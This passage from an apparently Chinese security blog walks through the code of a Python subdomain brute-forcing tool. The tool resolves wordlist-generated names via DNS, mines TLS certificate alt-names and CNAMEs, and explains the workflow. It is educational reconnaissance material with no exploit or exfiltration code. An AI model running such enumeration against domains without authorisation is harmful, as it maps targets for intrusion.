language_">self</span>.resolvers:</span><br><span class="line">            <span class="comment"># 解析事件</span></span><br><span class="line">            r.lifetime = <span class="number">6.0</span></span><br><span class="line">            <span class="comment"># 超时时间</span></span><br><span class="line">            r.timeout = <span class="number">10.0</span></span><br><span class="line">        <span class="comment"># 优先队列和状态变量</span></span><br><span class="line">        <span class="variable language_">self</span>.queue = PriorityQueue()</span><br><span class="line">        <span class="variable language_">self</span>.ip_dict = {}</span><br><span class="line">        <span class="variable language_">self</span>.found_subs = <span class="built_in">set</span>()</span><br><span class="line">        <span class="variable language_">self</span>.cert_subs = <span class="built_in">set</span>()</span><br><span class="line">        <span class="variable language_">self</span>.timeout_subs = {}</span><br><span class="line">        <span class="variable language_">self</span>.no_server_subs = {}</span><br><span class="line">        <span class="variable language_">self</span>.count_time = time.time()</span><br><span class="line">        <span class="comment"># 输出日志到文件</span></span><br><span class="line">        <span class="variable language_">self</span>.outfile = <span class="built_in">open</span>(<span class="string">'%s/%s_part_%s.txt'</span> % (tmp_dir, <span class="variable language_">self</span>.domain, <span class="variable language_">self</span>.process_num), <span class="string">'w'</span>)</span><br><span class="line">        <span class="variable language_">self</span>.normal_names_set = <span class="built_in">set</span>()</span><br><span class="line">        <span class="variable language_">self</span>.lock = asyncio.Lock()</span><br><span class="line">        <span class="comment"># 线程状态</span></span><br><span class="line">        <span class="variable language_">self</span>.threads_status = [<span class="string">'1'</span>] * <span class="variable language_">self</span>.options.threads</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载子域名字典</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">load_sub_names</span>(<span class="params">self</span>):</span><br><span class="line">        normal_lines = []</span><br><span class="line">        wildcard_lines = []</span><br><span class="line">        wildcard_set = <span class="built_in">set</span>()</span><br><span class="line">        regex_list = []</span><br><span class="line">        lines = <span class="built_in">set</span>()</span><br><span class="line">        <span class="comment"># 打开文件逐行读取子域名，跳过空行或重复子域名</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.options.file) <span class="keyword">as</span> inFile:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> inFile.readlines():</span><br><span class="line">                sub = line.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> sub <span class="keyword">or</span> sub <span class="keyword">in</span> lines:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                lines.add(sub)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 判断子域名是否含占位符</span></span><br><span class="line">                brace_count = sub.count(<span class="string">'{'</span>)</span><br><span class="line">                <span class="keyword">if</span> brace_count &gt; <span class="number">0</span>:</span><br><span class="line">                    wildcard_lines.append((brace_count, sub))</span><br><span class="line">					<span class="comment"># 占位符处理</span></span><br><span class="line">                    sub = sub.replace(<span class="string">'{alphnum}'</span>, <span class="string">'[a-z0-9]'</span>)</span><br><span class="line">                    sub = sub.replace(<span class="string">'{alpha}'</span>, <span class="string">'[a-z]'</span>)</span><br><span class="line">                    sub = sub.replace(<span class="string">'{num}'</span>, <span class="string">'[0-9]'</span>)</span><br><span class="line">                    <span class="comment"># 去重</span></span><br><span class="line">                    <span class="keyword">if</span> sub <span class="keyword">not</span> <span class="keyword">in</span> wildcard_set:</span><br><span class="line">                        wildcard_set.add(sub)</span><br><span class="line">                        regex_list.append(<span class="string">'^'</span> + sub + <span class="string">'$'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 普通子域名直接加入列表</span></span><br><span class="line">                    normal_lines.append(sub)</span><br><span class="line">                    <span class="variable language_">self</span>.normal_names_set.add(sub)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> regex_list:</span><br><span class="line">            pattern = <span class="string">'|'</span>.join(regex_list)</span><br><span class="line">            _regex = re.<span class="built_in">compile</span>(pattern)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> normal_lines:</span><br><span class="line">                <span class="keyword">if</span> _regex.search(line):</span><br><span class="line">                    normal_lines.remove(line)</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># 普通子域名加入队列，优先级为0</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> normal_lines[<span class="variable language_">self</span>.process_num::<span class="variable language_">self</span>.options.process]:</span><br><span class="line">            <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((<span class="number">0</span>, _))    <span class="comment"># priority set to 0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 含占位符的子域名直接加入队列</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> wildcard_lines[<span class="variable language_">self</span>.process_num::<span class="variable language_">self</span>.options.process]:</span><br><span class="line">            <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put(_)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测进程状态</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">update_counter</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'1'</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.threads_status:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="variable language_">self</span>.scan_count.value += <span class="variable language_">self</span>.scan_count_local</span><br><span class="line">            <span class="variable language_">self</span>.scan_count_local = <span class="number">0</span></span><br><span class="line">            <span class="variable language_">self</span>.queue_size_array[<span class="variable language_">self</span>.process_num] = <span class="variable language_">self</span>.queue.qsize()</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.found_count_local:</span><br><span class="line">                <span class="variable language_">self</span>.found_count.value += <span class="variable language_">self</span>.found_count_local</span><br><span class="line">                <span class="variable language_">self</span>.found_count_local = <span class="number">0</span></span><br><span class="line">            <span class="variable language_">self</span>.count_time = time.time()</span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测目标域名的SSL/TLS证书的扩展信息，提取符合条件的子域名</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">check_https_alt_names</span>(<span class="params">self, domain</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 建立异步HTTPS连接</span></span><br><span class="line">            reader, _ = <span class="keyword">await</span> asyncio.open_connection(</span><br><span class="line">                host=domain,</span><br><span class="line">                port=<span class="number">443</span>,</span><br><span class="line">                ssl=<span class="literal">True</span>,</span><br><span class="line">                server_hostname=domain,</span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># 获取证书详细信息</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> reader._transport.get_extra_info(<span class="string">'peercert'</span>)[<span class="string">'subjectAltName'</span>]:</span><br><span class="line">                <span class="keyword">if</span> item[<span class="number">0</span>].upper() == <span class="string">'DNS'</span>:</span><br><span class="line">                    name = item[<span class="number">1</span>].lower()</span><br><span class="line">                    <span class="comment"># 筛选符合条件的子域名</span></span><br><span class="line">                    <span class="keyword">if</span> name.endswith(<span class="variable language_">self</span>.domain):</span><br><span class="line">                        sub = name[:<span class="built_in">len</span>(name) - <span class="built_in">len</span>(<span class="variable language_">self</span>.domain) - <span class="number">1</span>]    <span class="comment"># new sub</span></span><br><span class="line">                        sub = sub.replace(<span class="string">'*'</span>, <span class="string">''</span>)</span><br><span class="line">                        sub = sub.strip(<span class="string">'.'</span>)</span><br><span class="line">                        <span class="comment"># 去重并添加到任务队列</span></span><br><span class="line">                        <span class="keyword">if</span> sub <span class="keyword">and</span> sub <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.found_subs <span class="keyword">and</span> \</span><br><span class="line">                                sub <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.normal_names_set <span class="keyword">and</span> sub <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.cert_subs:</span><br><span class="line">                            <span class="variable language_">self</span>.cert_subs.add(sub)</span><br><span class="line">                            <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((<span class="number">0</span>, sub))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询DNS解析结果，并限制查询的超时时间</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">do_query</span>(<span class="params">self, j, cur_domain</span>):</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> timeout(<span class="number">10.2</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">await</span> <span class="variable language_">self</span>.resolvers[j].resolve(cur_domain, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 扫描</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">self, j</span>):</span><br><span class="line">        <span class="comment"># 设置DNS解析器</span></span><br><span class="line">        <span class="variable language_">self</span>.resolvers[j].nameservers = [<span class="variable language_">self</span>.dns_servers[j % <span class="variable language_">self</span>.dns_count]]</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.dns_count &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                s = random.choice(<span class="variable language_">self</span>.dns_servers)</span><br><span class="line">                <span class="keyword">if</span> s != <span class="variable language_">self</span>.dns_servers[j % <span class="variable language_">self</span>.dns_count]:</span><br><span class="line">                    <span class="variable language_">self</span>.resolvers[j].nameservers.append(s)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        empty_counter = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 处理子域</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                brace_count, sub = <span class="variable language_">self</span>.queue.get_nowait()</span><br><span class="line">                <span class="variable language_">self</span>.threads_status[j] = <span class="string">'1'</span></span><br><span class="line">                empty_counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">except</span> asyncio.queues.QueueEmpty <span class="keyword">as</span> e:</span><br><span class="line">                empty_counter += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> empty_counter &gt; <span class="number">10</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.threads_status[j] = <span class="string">'0'</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'1'</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.threads_status:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 对于带有通配符的子域进行处理</span></span><br><span class="line">            <span class="keyword">if</span> brace_count &gt; <span class="number">0</span>:</span><br><span class="line">                brace_count -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> sub.find(<span class="string">'{next_sub}'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="variable language_">self</span>.next_subs:</span><br><span class="line">                        <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((<span class="number">0</span>, sub.replace(<span class="string">'{next_sub}'</span>, _)))</span><br><span class="line">                <span class="keyword">if</span> sub.find(<span class="string">'{alphnum}'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>:</span><br><span class="line">                        <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((brace_count, sub.replace(<span class="string">'{alphnum}'</span>, _, <span class="number">1</span>)))</span><br><span class="line">                <span class="keyword">elif</span> sub.find(<span class="string">'{alpha}'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>:</span><br><span class="line">                        <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((brace_count, sub.replace(<span class="string">'{alpha}'</span>, _, <span class="number">1</span>)))</span><br><span class="line">                <span class="keyword">elif</span> sub.find(<span class="string">'{num}'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">                        <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((brace_count, sub.replace(<span class="string">'{num}'</span>, _, <span class="number">1</span>)))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> sub <span class="keyword">in</span> <span class="variable language_">self</span>.found_subs:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="variable language_">self</span>.scan_count_local += <span class="number">1</span></span><br><span class="line">                cur_domain = sub + <span class="string">'.'</span> + <span class="variable language_">self</span>.domain</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 执行DNS查询</span></span><br><span class="line">                answers = <span class="keyword">await</span> <span class="variable language_">self</span>.do_query(j, cur_domain)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 处理DNS查询结果，排除无效IP</span></span><br><span class="line">                <span class="keyword">if</span> answers:</span><br><span class="line">                    <span class="variable language_">self</span>.found_subs.add(sub)</span><br><span class="line">                    ips = <span class="string">', '</span>.join(<span class="built_in">sorted</span>([answer.address <span class="keyword">for</span> answer <span class="keyword">in</span> answers]))</span><br><span class="line">                    invalid_ip_found = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">for</span> answer <span class="keyword">in</span> answers:</span><br><span class="line">                        <span class="keyword">if</span> answer.address <span class="keyword">in</span> [<span class="string">'1.1.1.1'</span>, <span class="string">'127.0.0.1'</span>, <span class="string">'0.0.0.0'</span>, <span class="string">'0.0.0.1'</span>]:</span><br><span class="line">                            invalid_ip_found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> invalid_ip_found:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="variable language_">self</span>.options.i <span class="keyword">and</span> is_intranet(answers[<span class="number">0</span>].host):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="comment"># 查询CNAME记录</span></span><br><span class="line">                        cname = <span class="built_in">str</span>(answers.canonical_name)[:-<span class="number">1</span>]</span><br><span class="line">                        <span class="keyword">if</span> cname != cur_domain <span class="keyword">and</span> cname.endswith(<span class="variable language_">self</span>.domain):</span><br><span class="line">                            cname_sub = cname[:<span class="built_in">len</span>(cname) - <span class="built_in">len</span>(<span class="variable language_">self</span>.domain) - <span class="number">1</span>]    <span class="comment"># new sub</span></span><br><span class="line">                            <span class="keyword">if</span> cname_sub <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.found_subs <span class="keyword">and</span> cname_sub <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.normal_names_set:</span><br><span class="line">                                <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((<span class="number">0</span>, cname_sub))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                    first_level_sub = sub.split(<span class="string">'.'</span>)[-<span class="number">1</span>]</span><br><span class="line">                    max_found = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="variable language_">self</span>.options.w:</span><br><span class="line">                        first_level_sub = <span class="string">''</span></span><br><span class="line">                        max_found = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (first_level_sub, ips) <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.ip_dict:</span><br><span class="line">                        <span class="variable language_">self</span>.ip_dict[(first_level_sub, ips)] = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="variable language_">self</span>.ip_dict[(first_level_sub, ips)] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">if</span> <span class="variable language_">self</span>.ip_dict[(first_level_sub, ips)] &gt; max_found:</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="variable language_">self</span>.found_count_local += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 将查询结果写入文件</span></span><br><span class="line">                    <span class="variable language_">self</span>.outfile.write(cur_domain.ljust(<span class="number">30</span>) + <span class="string">'\t'</span> + ips + <span class="string">'\n'</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.outfile.flush()</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 检查HTTPS证书</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.options.no_cert_check:</span><br><span class="line">                        <span class="keyword">async</span> <span class="keyword">with</span> timeout(<span class="number">10.0</span>):</span><br><span class="line">                            <span class="keyword">await</span> <span class="variable language_">self</span>.check_https_alt_names(cur_domain)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="variable language_">self</span>.scan_count_local += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">await</span> <span class="variable language_">self</span>.do_query(j, <span class="string">'lijiejie-test-not-existed.'</span> + cur_domain)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">except</span> dns.resolver.NXDOMAIN <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">if</span> <span class="variable language_">self</span>.queue.qsize() &lt; <span class="number">20000</span>:</span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="variable language_">self</span>.next_subs:</span><br><span class="line">                                <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((<span class="number">0</span>, _ + <span class="string">'.'</span> + sub))</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((<span class="number">1</span>, <span class="string">'{next_sub}.'</span> + sub))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> dns.resolver.NoNameservers <span class="keyword">as</span> e:</span><br><span class="line">                <span class="variable language_">self</span>.no_server_subs[sub] = <span class="variable language_">self</span>.no_server_subs.get(sub, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.no_server_subs[sub] &lt;= <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((<span class="number">0</span>, sub))    <span class="comment"># Retry again</span></span><br><span class="line">            <span class="keyword">except</span> (dns.exception.Timeout, dns.resolver.LifetimeTimeout) <span class="keyword">as</span> e:</span><br><span class="line">                <span class="variable language_">self</span>.timeout_subs[sub] = <span class="variable language_">self</span>.timeout_subs.get(sub, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.timeout_subs[sub] &lt;= <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">await</span> <span class="variable language_">self</span>.queue.put((<span class="number">0</span>, sub))    <span class="comment"># Retry again</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span>(<span class="built_in">type</span>(e)).find(<span class="string">'asyncio.exceptions.TimeoutError'</span>) &lt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'errors.log'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> errFile:</span><br><span class="line">                        errFile.write(<span class="string">'[%s] %s\n'</span> % (<span class="built_in">type</span>(e), <span class="built_in">str</span>(e)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">async_run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">self</span>.load_sub_names()</span><br><span class="line">        tasks = [<span class="variable language_">self</span>.scan(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.options.threads)]</span><br><span class="line">        tasks.insert(<span class="number">0</span>, <span class="variable language_">self</span>.update_counter())</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        loop = asyncio.get_event_loop()</span><br><span class="line">        asyncio.set_event_loop(loop)</span><br><span class="line">        loop.run_until_complete(<span class="variable language_">self</span>.async_run())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_process</span>(<span class="params">*params</span>):</span><br><span class="line">    <span class="comment"># 信号处理器</span></span><br><span class="line">    signal.signal(signal.SIGINT, user_abort)</span><br><span class="line">    <span class="comment"># 调用SubNameBrute的run方法</span></span><br><span class="line">    s = SubNameBrute(*params)</span><br><span class="line">    s.run()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据option.process启动多个进程</span></span><br><span class="line"><span class="keyword">for</span> process_num <span class="keyword">in</span> <span class="built_in">range</span>(options.process):</span><br><span class="line">    p = multiprocessing.Process(</span><br><span class="line">        <span class="comment"># 调用run_process进行扫描</span></span><br><span class="line">        target=run_process,</span><br><span class="line">        args=(domain, options, process_num, dns_servers, next_subs,</span><br><span class="line">              scan_count, found_count, queue_size_array, tmp_dir)</span><br><span class="line">    )</span><br><span class="line">    all_process.append(p)</span><br><span class="line">    p.start()</span><br></pre></td></tr></tbody></table></figure>

<p>总体的工作路径为：</p>
<ul>
<li><strong>加载子域名</strong>：从文件中读取子域名，识别通配符，放入任务队列</li>
<li>扫描子域<ul>
<li>多线程扫描子域</li>
<li>对每个子域执行DNS查询，处理返回结果</li>
<li>对子域名进行证书检查，CNAME解析等附加操作</li>
</ul>
</li>
<li><strong>记录结果</strong></li>
<li><strong>错误处理与重试</strong>：对于DNS查询失败的子域进行重试，最多三次</li>
</ul>
<p>这里有个证书检查和CNAME解析，还有一个称呼叫<strong>证书透明度</strong>主要原因是<strong>提高全面性</strong>。在<strong>SSL/TLS</strong>证书中的<code>subjectAltName</code>字段会暴露一些隐藏子域。<strong>CNAME</strong>是DNS中的一种记录类别，通常用于将一个域名指向另一个域名，也就是说CNAME可以为某个域名创建一个别名，因此可以去发现隐藏的域名，增加子域名查询的全面性。</p>
<p><strong>对于通配符子域名的处理</strong>：讲这些子域存在一个集合中，避免重复爆破，根据查询CNAME和MX记录，挖掘更多的子域，并且进行递归查询。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
</search>
